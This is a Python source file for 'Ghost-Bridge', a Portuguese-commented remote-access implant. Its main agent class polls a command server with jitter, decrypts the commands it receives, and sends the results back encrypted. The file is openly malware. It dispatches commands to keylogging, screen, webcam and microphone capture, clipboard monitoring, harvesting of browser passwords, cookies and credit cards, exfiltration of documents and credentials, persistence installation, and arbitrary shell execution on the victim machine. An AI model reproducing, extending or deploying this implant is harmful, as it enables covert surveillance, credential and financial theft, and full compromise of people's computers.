"""
Ghost-Bridge - Agent (Implant)
Agente completo com todos os módulos de coleta.
"""
import time
import random
import subprocess
import platform
import json
import sys
import os

# Adiciona diretório raiz ao path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import config
from connectors import get_connector
import crypto_utils

# Import condicional dos módulos
MODULES_AVAILABLE = {}

try:
    from modules.keylogger import Keylogger
    MODULES_AVAILABLE['keylogger'] = True
except ImportError as e:
    MODULES_AVAILABLE['keylogger'] = False

try:
    from modules.screenshot import ScreenCapture
    MODULES_AVAILABLE['screenshot'] = True
except ImportError:
    MODULES_AVAILABLE['screenshot'] = False

try:
    from modules.clipboard import ClipboardMonitor
    MODULES_AVAILABLE['clipboard'] = True
except ImportError:
    MODULES_AVAILABLE['clipboard'] = False

try:
    from modules.browser import BrowserHarvester
    MODULES_AVAILABLE['browser'] = True
except ImportError:
    MODULES_AVAILABLE['browser'] = False

try:
    from modules.system_info import SystemRecon
    MODULES_AVAILABLE['system_info'] = True
except ImportError:
    MODULES_AVAILABLE['system_info'] = False

try:
    from modules.file_exfil import FileExfiltrator
    MODULES_AVAILABLE['file_exfil'] = True
except ImportError:
    MODULES_AVAILABLE['file_exfil'] = False

try:
    from modules.webcam import WebcamCapture
    MODULES_AVAILABLE['webcam'] = True
except ImportError:
    MODULES_AVAILABLE['webcam'] = False

try:
    from modules.audio import AudioRecorder
    MODULES_AVAILABLE['audio'] = True
except ImportError:
    MODULES_AVAILABLE['audio'] = False

try:
    from modules.persistence import PersistenceManager
    MODULES_AVAILABLE['persistence'] = True
except ImportError:
    MODULES_AVAILABLE['persistence'] = False


class GhostAgent:
    """
    Agente principal do Ghost-Bridge.
    
    Comandos especiais (prefixados com !):
        !help                   - Lista comandos disponíveis
        !info                   - Informações do agente
        !recon                  - Reconhecimento completo do sistema
        !screenshot             - Captura screenshot
        !webcam                 - Captura foto da webcam
        !keylog start           - Inicia keylogger
        !keylog stop            - Para e retorna logs
        !clipboard start        - Inicia monitor de clipboard
        !clipboard stop         - Para e retorna histórico
        !audio <segundos>       - Grava áudio do microfone
        !browser passwords      - Extrai senhas salvas
        !browser cookies        - Extrai cookies
        !browser history        - Extrai histórico
        !browser all            - Extrai tudo
        !files search <path>    - Busca arquivos sensíveis
        !files read <path>      - Lê conteúdo de arquivo
        !files exfil docs       - Exfiltra documentos
        !files exfil creds      - Exfiltra credenciais
        !persist install        - Instala persistência
        !persist remove         - Remove persistência
        !persist check          - Verifica status
        !shell <comando>        - Executa comando shell (padrão)
    """
    
    def __init__(self):
        self.connector = get_connector()
        self.os_type = platform.system()
        
        # Instâncias dos módulos (lazy loading)
        self._keylogger = None
        self._clipboard = None
        self._screenshot = None
        self._webcam = None
        self._audio = None
        self._browser = None
        self._recon = None
        self._file_exfil = None
        self._persistence = None
        
        print(f"[*] Ghost Agent v2.0 iniciado em {self.os_type}")
        print(f"[*] Módulos disponíveis: {sum(MODULES_AVAILABLE.values())}/{len(MODULES_AVAILABLE)}")
    
    # ==========================================
    # LAZY LOADING DOS MÓDULOS
    # ==========================================
    
    @property
    def keylogger(self):
        if self._keylogger is None and MODULES_AVAILABLE.get('keylogger'):
            self._keylogger = Keylogger()
        return self._keylogger
    
    @property
    def clipboard(self):
        if self._clipboard is None and MODULES_AVAILABLE.get('clipboard'):
            self._clipboard = ClipboardMonitor()
        return self._clipboard
    
    @property
    def screenshot(self):
        if self._screenshot is None and MODULES_AVAILABLE.get('screenshot'):
            self._screenshot = ScreenCapture(quality=40, max_width=1280)
        return self._screenshot
    
    @property
    def webcam(self):
        if self._webcam is None and MODULES_AVAILABLE.get('webcam'):
            self._webcam = WebcamCapture(quality=40)
        return self._webcam
    
    @property
    def audio(self):
        if self._audio is None and MODULES_AVAILABLE.get('audio'):
            self._audio = AudioRecorder()
        return self._audio
    
    @property
    def browser(self):
        if self._browser is None and MODULES_AVAILABLE.get('browser'):
            self._browser = BrowserHarvester()
        return self._browser
    
    @property
    def recon(self):
        if self._recon is None and MODULES_AVAILABLE.get('system_info'):
            self._recon = SystemRecon()
        return self._recon
    
    @property
    def file_exfil(self):
        if self._file_exfil is None and MODULES_AVAILABLE.get('file_exfil'):
            self._file_exfil = FileExfiltrator()
        return self._file_exfil
    
    @property
    def persistence(self):
        if self._persistence is None and MODULES_AVAILABLE.get('persistence'):
            self._persistence = PersistenceManager()
        return self._persistence
    
    # ==========================================
    # PROCESSADOR DE COMANDOS
    # ==========================================
    
    def process_command(self, cmd_text):
        """
        Processa um comando e retorna o resultado.
        
        Args:
            cmd_text: Texto do comando
            
        Returns:
            String ou dict com resultado
        """
        cmd_text = cmd_text.strip()
        
        # Comandos especiais começam com !
        if cmd_text.startswith('!'):
            return self._process_special_command(cmd_text[1:])
        else:
            # Comando shell padrão
            return self._execute_shell(cmd_text)
    
    def _process_special_command(self, cmd):
        """Processa comandos especiais do toolkit."""
        parts = cmd.split(None, 2)
        action = parts[0].lower() if parts else ''
        args = parts[1:] if len(parts) > 1 else []
        
        try:
            # ==========================================
            # COMANDOS BÁSICOS
            # ==========================================
            
            if action == 'help':
                return self._cmd_help()
            
            elif action == 'info':
                return self._cmd_info()
            
            elif action == 'modules':
                return self._cmd_modules()
            
            # ==========================================
            # RECONHECIMENTO
            # ==========================================
            
            elif action == 'recon':
                if not self.recon:
                    return {'error': 'Módulo system_info não disponível'}
                return self.recon.full_recon()
            
            # ==========================================
            # SCREENSHOT
            # ==========================================
            
            elif action == 'screenshot':
                if not self.screenshot:
                    return {'error': 'Módulo screenshot não disponível'}
                return self.screenshot.capture()
            
            elif action == 'screenshots':
                if not self.screenshot:
                    return {'error': 'Módulo screenshot não disponível'}
                count = int(args[0]) if args else 3
                return self.screenshot.capture_all_monitors()
            
            # ==========================================
            # WEBCAM
            # ==========================================
            
            elif action == 'webcam':
                if not self.webcam:
                    return {'error': 'Módulo webcam não disponível'}
                if args and args[0] == 'list':
                    return self.webcam.list_cameras()
                return self.webcam.capture_photo()
            
            # ==========================================
            # ÁUDIO
            # ==========================================
            
            elif action == 'audio':
                if not self.audio:
                    return {'error': 'Módulo audio não disponível'}
                duration = int(args[0]) if args else 10
                return self.audio.record(duration=min(duration, 60))  # Max 60s
            
            # ==========================================
            # KEYLOGGER
            # ==========================================
            
            elif action == 'keylog':
                if not self.keylogger:
                    return {'error': 'Módulo keylogger não disponível'}
                
                subaction = args[0].lower() if args else 'status'
                
                if subaction == 'start':
                    self.keylogger.start()
                    return {'status': 'keylogger started'}
                
                elif subaction == 'stop':
                    logs = self.keylogger.get_logs()
                    self.keylogger.stop()
                    return {'status': 'keylogger stopped', 'logs': logs}
                
                elif subaction == 'dump':
                    return {'logs': self.keylogger.get_logs()}
                
                else:
                    return {'running': self.keylogger.running, 
                            'buffer_size': self.keylogger.get_buffer_size()}
            
            # ==========================================
            # CLIPBOARD
            # ==========================================
            
            elif action == 'clipboard':
                if not self.clipboard:
                    return {'error': 'Módulo clipboard não disponível'}
                
                subaction = args[0].lower() if args else 'now'
                
                if subaction == 'start':
                    self.clipboard.start()
                    return {'status': 'clipboard monitor started'}
                
                elif subaction == 'stop':
                    history = self.clipboard.get_history()
                    self.clipboard.stop()
                    return {'status': 'clipboard monitor stopped', 'history': history}
                
                elif subaction == 'now':
                    return self.clipboard.capture_now()
                
                else:
                    return self.clipboard.get_history(clear=False)
            
            # ==========================================
            # BROWSER
            # ==========================================
            
            elif action == 'browser':
                if not self.browser:
                    return {'error': 'Módulo browser não disponível'}
                
                subaction = args[0].lower() if args else 'all'
                browser_name = args[1] if len(args) > 1 else 'chrome'
                
                if subaction == 'passwords':
                    return self.browser.harvest_passwords(browser_name)
                
                elif subaction == 'cookies':
                    return self.browser.harvest_cookies(browser_name)
                
                elif subaction == 'history':
                    return self.browser.harvest_history(browser_name)
                
                elif subaction == 'cards':
                    return self.browser.harvest_credit_cards(browser_name)
                
                elif subaction == 'all':
                    return self.browser.harvest_all()
                
                else:
                    return {'error': f'Subcomando desconhecido: {subaction}'}
            
            # ==========================================
            # FILES
            # ==========================================
            
            elif action == 'files':
                if not self.file_exfil:
                    return {'error': 'Módulo file_exfil não disponível'}
                
                subaction = args[0].lower() if args else 'search'
                
                if subaction == 'search':
                    path = args[1] if len(args) > 1 else None
                    paths = [path] if path else None
                    return self.file_exfil.search_files(paths=paths, max_results=50)
                
                elif subaction == 'read':
                    if len(args) < 2:
                        return {'error': 'Especifique o caminho do arquivo'}
                    return self.file_exfil.read_file(args[1])
                
                elif subaction == 'exfil':
                    target = args[1] if len(args) > 1 else 'docs'
                    if target == 'docs':
                        return self.file_exfil.exfiltrate_documents()
                    elif target == 'creds':
                        return self.file_exfil.exfiltrate_credentials()
                    else:
                        return {'error': f'Tipo desconhecido: {target}'}
                
                elif subaction == 'secrets':
                    path = args[1] if len(args) > 1 else os.path.expanduser('~')
                    return self.file_exfil.search_for_secrets(path)
                
                else:
                    return {'error': f'Subcomando desconhecido: {subaction}'}
            
            # ==========================================
            # PERSISTENCE
            # ==========================================
            
            elif action == 'persist':
                if not self.persistence:
                    return {'error': 'Módulo persistence não disponível'}
                
                subaction = args[0].lower() if args else 'check'
                
                if subaction == 'install':
                    return self.persistence.install_all()
                
                elif subaction == 'remove':
                    return self.persistence.remove_all()
                
                elif subaction == 'check':
                    return self.persistence.check_persistence()
                
                else:
                    return {'error': f'Subcomando desconhecido: {subaction}'}
            
            # ==========================================
            # SHELL
            # ==========================================
            
            elif action == 'shell':
                if args:
                    return self._execute_shell(' '.join(args))
                return {'error': 'Especifique o comando'}
            
            # ==========================================
            # DESCONHECIDO
            # ==========================================
            
            else:
                return {'error': f'Comando desconhecido: {action}', 'hint': 'Use !help'}
        
        except Exception as e:
            return {'error': str(e), 'command': cmd}
    
    def _cmd_help(self):
        """Retorna lista de comandos disponíveis."""
        return """
╔══════════════════════════════════════════════════════════════╗
║                    GHOST-BRIDGE COMMANDS                      ║
╠══════════════════════════════════════════════════════════════╣
║ BÁSICO                                                        ║
║   !help              - Esta mensagem                          ║
║   !info              - Informações do agente                  ║
║   !modules           - Módulos disponíveis                    ║
║   !recon             - Reconhecimento completo                ║
║                                                               ║
║ CAPTURA                                                       ║
║   !screenshot        - Captura tela                           ║
║   !webcam            - Captura foto webcam                    ║
║   !audio <seg>       - Grava áudio (padrão: 10s)              ║
║                                                               ║
║ MONITORAMENTO                                                 ║
║   !keylog start      - Inicia keylogger                       ║
║   !keylog stop       - Para e retorna logs                    ║
║   !clipboard start   - Inicia monitor clipboard               ║
║   !clipboard stop    - Para e retorna histórico               ║
║                                                               ║
║ BROWSER                                                       ║
║   !browser all       - Extrai tudo (senhas, cookies, etc)     ║
║   !browser passwords - Apenas senhas                          ║
║   !browser cookies   - Apenas cookies                         ║
║   !browser history   - Apenas histórico                       ║
║                                                               ║
║ ARQUIVOS                                                      ║
║   !files search      - Busca arquivos sensíveis               ║
║   !files read <path> - Lê arquivo                             ║
║   !files exfil docs  - Exfiltra documentos                    ║
║   !files exfil creds - Exfiltra credenciais                   ║
║   !files secrets     - Busca segredos em configs              ║
║                                                               ║
║ PERSISTÊNCIA                                                  ║
║   !persist install   - Instala persistência                   ║
║   !persist remove    - Remove persistência                    ║
║   !persist check     - Verifica status                        ║
║                                                               ║
║ SHELL                                                         ║
║   <comando>          - Executa comando no shell               ║
║   !shell <cmd>       - Executa comando explicitamente         ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    def _cmd_info(self):
        """Retorna informações do agente."""
        return {
            'version': '2.0',
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'username': os.environ.get('USERNAME', 'unknown'),
            'domain': os.environ.get('USERDOMAIN', 'WORKGROUP'),
            'pid': os.getpid(),
            'cwd': os.getcwd(),
            'modules': MODULES_AVAILABLE
        }
    
    def _cmd_modules(self):
        """Lista status dos módulos."""
        return MODULES_AVAILABLE
    
    def _execute_shell(self, cmd):
        """Executa comando no shell do sistema."""
        try:
            output = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "[ERRO: Timeout - comando demorou mais de 30s]"
        except subprocess.CalledProcessError as e:
            return f"[ERRO]: {e.output.decode('utf-8', errors='ignore')}"
        except Exception as e:
            return f"[ERRO]: {str(e)}"
    
    # ==========================================
    # LOOP PRINCIPAL
    # ==========================================
    
    def run(self):
        """Loop principal do agente."""
        print("[*] Entrando em modo Stealth (Polling)...")
        
        while True:
            try:
                # 1. Checar por novos comandos
                commands = self.connector.get_commands()
                
                for cmd_obj in commands:
                    cmd_id = cmd_obj['id']
                    encrypted_cmd = cmd_obj['cmd']
                    
                    # Descriptografa
                    cmd_text = crypto_utils.decrypt_data(encrypted_cmd)
                    print(f"[+] Comando recebido: {cmd_text[:50]}...")
                    
                    # 2. Processa comando
                    result = self.process_command(cmd_text)
                    
                    # Converte dict para JSON
                    if isinstance(result, dict):
                        result = json.dumps(result, indent=2, ensure_ascii=False)
                    
                    # 3. Envia resultado criptografado
                    encrypted_result = crypto_utils.encrypt_data(str(result))
                    self.connector.send_result(cmd_id, encrypted_result)
                
                # 4. Jitter
                sleep_time = random.randint(
                    config.POLL_INTERVAL_MIN, 
                    config.POLL_INTERVAL_MAX
                )
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print("[!] Agente encerrado.")
                break
            except Exception as e:
                print(f"[!] Erro no loop: {e}")
                time.sleep(5)


# ==========================================
# ENTRY POINT
# ==========================================

if __name__ == "__main__":
    agent = GhostAgent()
    
    # Argumentos de linha de comando
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        
        if arg == '--install':
            # Instala persistência
            if agent.persistence:
                result = agent.persistence.install_all()
                print(json.dumps(result, indent=2))
            else:
                print("[!] Módulo de persistência não disponível")
        
        elif arg == '--remove':
            # Remove persistência
            if agent.persistence:
                result = agent.persistence.remove_all()
                print(json.dumps(result, indent=2))
        
        elif arg == '--info':
            # Mostra info
            print(json.dumps(agent._cmd_info(), indent=2))
        
        elif arg == '--test':
            # Modo teste (executa um comando e sai)
            cmd = ' '.join(sys.argv[2:]) if len(sys.argv) > 2 else '!info'
            result = agent.process_command(cmd)
            print(result if isinstance(result, str) else json.dumps(result, indent=2))
        
        else:
            print(f"[!] Argumento desconhecido: {arg}")
            print("Uso: python agent.py [--install|--remove|--info|--test <cmd>]")
    
    else:
        # Inicia loop normal
        agent.run()
